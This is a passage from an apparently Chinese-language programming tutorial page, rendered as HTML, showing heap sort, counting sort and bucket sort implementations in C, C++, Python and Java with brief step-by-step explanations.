<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span> &#125;;</span><br><span class="line">    <span class="type">int</span> len = (<span class="type">int</span>) <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(*arr);</span><br><span class="line">    <span class="built_in">heap_sort</span>(arr, len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-6"><a href="#Python：-6" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">buildMaxHeap</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">import</span> math</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(math.floor(<span class="built_in">len</span>(arr)/<span class="number">2</span>),-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        heapify(arr,i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heapify</span>(<span class="params">arr, i</span>):</span><br><span class="line">    left = <span class="number">2</span>*i+<span class="number">1</span></span><br><span class="line">    right = <span class="number">2</span>*i+<span class="number">2</span></span><br><span class="line">    largest = i</span><br><span class="line">    <span class="keyword">if</span> left &lt; arrLen <span class="keyword">and</span> arr[left] &gt; arr[largest]:</span><br><span class="line">        largest = left</span><br><span class="line">    <span class="keyword">if</span> right &lt; arrLen <span class="keyword">and</span> arr[right] &gt; arr[largest]:</span><br><span class="line">        largest = right</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> largest != i:</span><br><span class="line">        swap(arr, i, largest)</span><br><span class="line">        heapify(arr, largest)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">arr, i, j</span>):</span><br><span class="line">    arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heapSort</span>(<span class="params">arr</span>):</span><br><span class="line">    <span class="keyword">global</span> arrLen</span><br><span class="line">    arrLen = <span class="built_in">len</span>(arr)</span><br><span class="line">    buildMaxHeap(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">        swap(arr,<span class="number">0</span>,i)</span><br><span class="line">        arrLen -=<span class="number">1</span></span><br><span class="line">        heapify(arr, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java：-6"><a href="#Java：-6" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length;</span><br><span class="line"></span><br><span class="line">        buildMaxHeap(arr, len);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> len - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            swap(arr, <span class="number">0</span>, i);</span><br><span class="line">            len--;</span><br><span class="line">            heapify(arr, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildMaxHeap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (<span class="type">int</span>) Math.floor(len / <span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            heapify(arr, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> i, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">largest</span> <span class="operator">=</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">            largest = left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">            largest = right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">            swap(arr, i, largest);</span><br><span class="line">            heapify(arr, largest, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="八、计数排序"><a href="#八、计数排序" class="headerlink" title="八、计数排序"></a>八、计数排序</h3><h4 id="1-算法步骤-7"><a href="#1-算法步骤-7" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>找出待排序的数组中最大和最小的元素</p><p>统计数组中每个值为i的元素出现的次数，存入数组C的第i项</p><p>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）</p><p>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1</p><h4 id="2-代码实现-7"><a href="#2-代码实现-7" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-5"><a href="#C：-5" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, arr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">counting_sort</span><span class="params">(<span class="type">int</span> *ini_arr, <span class="type">int</span> *sorted_arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> *count_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">100</span>);</span><br><span class="line">        <span class="type">int</span> i, j, k;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                count_arr[k] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                count_arr[ini_arr[i]]++;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">                count_arr[k] += count_arr[k - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (j = n; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">                sorted_arr[--count_arr[ini_arr[j - <span class="number">1</span>]]] = ini_arr[j - <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">free</span>(count_arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> *arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">        <span class="type">int</span> *sorted_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">        srand(time(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                arr[i] = rand() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ini_array: &quot;</span>);</span><br><span class="line">        print_arr(arr, n);</span><br><span class="line">        counting_sort(arr, sorted_arr, n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sorted_array: &quot;</span>);</span><br><span class="line">        print_arr(sorted_arr, n);</span><br><span class="line">        <span class="built_in">free</span>(arr);</span><br><span class="line">        <span class="built_in">free</span>(sorted_arr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="C-：-5"><a href="#C-：-5" class="headerlink" title="C++："></a>C++：</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">101</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//计数排序实现方法如其名 但是局限性很大。 </span></span><br><span class="line"><span class="comment">//(若最大数很大或者数值范围无法确定时，消耗时间反而很会多，并且空间复杂度也高)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CountingSort</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;a)</span></span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">count</span><span class="params">(MAX, <span class="number">0</span>)</span></span>;           <span class="comment">//统计每个数字出现的次数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;x : a)</span><br><span class="line">count[x]++;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> num = <span class="number">0</span>; num &lt; MAX; num++)&#123;</span><br><span class="line">    <span class="keyword">while</span>(count[num])&#123;</span><br><span class="line">        a[k++] = num;</span><br><span class="line">        count[num]--;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;().<span class="built_in">swap</span>(count);           <span class="comment">//相当于用一个空直接换掉</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;v)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;x : v)</span><br><span class="line">        cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">main</span>()&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; a;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">srand</span>((<span class="type">int</span>)<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        a.<span class="built_in">push_back</span>(<span class="built_in">rand</span>() % <span class="number">100</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">show</span>(a);</span><br><span class="line">    <span class="built_in">CountingSort</span>(a);</span><br><span class="line">    cout&lt;&lt;endl&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">show</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Python：-7"><a href="#Python：-7" class="headerlink" title="Python："></a>Python：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">countingSort</span>(<span class="params">arr, maxValue</span>):</span><br><span class="line">    bucketLen = maxValue+<span class="number">1</span></span><br><span class="line">    bucket = [<span class="number">0</span>]*bucketLen</span><br><span class="line">    sortedIndex =<span class="number">0</span></span><br><span class="line">    arrLen = <span class="built_in">len</span>(arr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(arrLen):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bucket[arr[i]]:</span><br><span class="line">            bucket[arr[i]]=<span class="number">0</span></span><br><span class="line">        bucket[arr[i]]+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(bucketLen):</span><br><span class="line">        <span class="keyword">while</span> bucket[j]&gt;<span class="number">0</span>:</span><br><span class="line">            arr[sortedIndex] = j</span><br><span class="line">            sortedIndex+=<span class="number">1</span></span><br><span class="line">            bucket[j]-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> arr</span><br></pre></td></tr></table></figure><h5 id="Java：-7"><a href="#Java：-7" class="headerlink" title="Java："></a>Java：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CountingSort</span> <span class="keyword">implements</span> <span class="title class_">IArraySort</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sort(<span class="type">int</span>[] sourceArray) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 对 arr 进行拷贝，不改变参数内容</span></span><br><span class="line">        <span class="type">int</span>[] arr = Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> getMaxValue(arr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> countingSort(arr, maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] countingSort(<span class="type">int</span>[] arr, <span class="type">int</span> maxValue) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bucketLen</span> <span class="operator">=</span> maxValue + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[bucketLen];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">            bucket[value]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">sortedIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketLen; j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (bucket[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                arr[sortedIndex++] = j;</span><br><span class="line">                bucket[j]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getMaxValue</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxValue</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> value : arr) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue = value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="九、桶排序"><a href="#九、桶排序" class="headerlink" title="九、桶排序"></a>九、桶排序</h3><h4 id="1-算法步骤-8"><a href="#1-算法步骤-8" class="headerlink" title="1.算法步骤"></a>1.算法步骤</h4><p>桶排序假设待排序的一组数均匀独立的分布在一个范围中，并将这一范围划分成几个子范围（桶）。</p><p>然后基于某种映射函数f ，将待排序列的关键字 k 映射到第i个桶中 (即桶数组B 的下标i) ，那么该关键字k 就作为 B[i]中的元素 (每个桶B[i]都是一组大小为N&#x2F;M 的序列 )。</p><p>接着将各个桶中的数据有序的合并起来 : 对每个桶B[i] 中的所有元素进行比较排序 (可以使用快排)。然后依次枚举输出 B[0]….B[M] 中的全部内容即是一个有序序列。</p><h4 id="2-代码实现-8"><a href="#2-代码实现-8" class="headerlink" title="2.代码实现"></a>2.代码实现</h4><h5 id="C：-6"><a href="#C：-6" class="headerlink" title="C："></a>C：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max_len 10      <span class="comment">//数组元素个数</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show</span><span class="params">(<span class="type">int</span>  arr[], <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;n; i++ )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, arr[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//获得未排序数组中最大的一个元素值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetMaxVal</span><span class="params">(<span class="type">int</span>* arr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> maxVal = arr[<span class="number">0</span>]; <span class="comment">//假设最大为arr[0]</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len; i++)  <span class="comment">//遍历比较，找到大的就赋值给maxVal</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] &gt; maxVal)</span><br><span class="line">            maxVal = arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> maxVal;  <span class="comment">//返回最大值</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//桶排序   参数：数组及其长度</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">BucketSort</span><span class="params">(<span class="type">int</span>* arr , <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tmpArrLen = GetMaxVal(arr , len) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> tmpArr[tmpArrLen];  <span class="comment">//获得空桶大小</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; tmpArrLen; i++)  <span class="comment">//空桶初始化</span></span><br><span class="line">        tmpArr[i] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; len; i++)   <span class="comment">//寻访序列，并且把项目一个一个放到对应的桶子去。</span></span><br><span class="line">        tmpArr[ arr[i] ]++;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; tmpArrLen; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>( tmpArr[ i ] != <span class="number">0</span>) <span class="comment">//对每个不是空的桶子进行排序。</span></span><br><span class="line">        &#123;</span><br><span class="line">            arr[j ] = i;  <span class="comment">//从不是空的桶子里把项目再放回原来的序列中。</span></span><br><span class="line">            j++;</span><br><span class="line">            tmpArr[i]--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   <span class="comment">//测试数据</span></span><br><span class="line">    <span class="type">int</span> arr_test[Max_len] = &#123; <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span 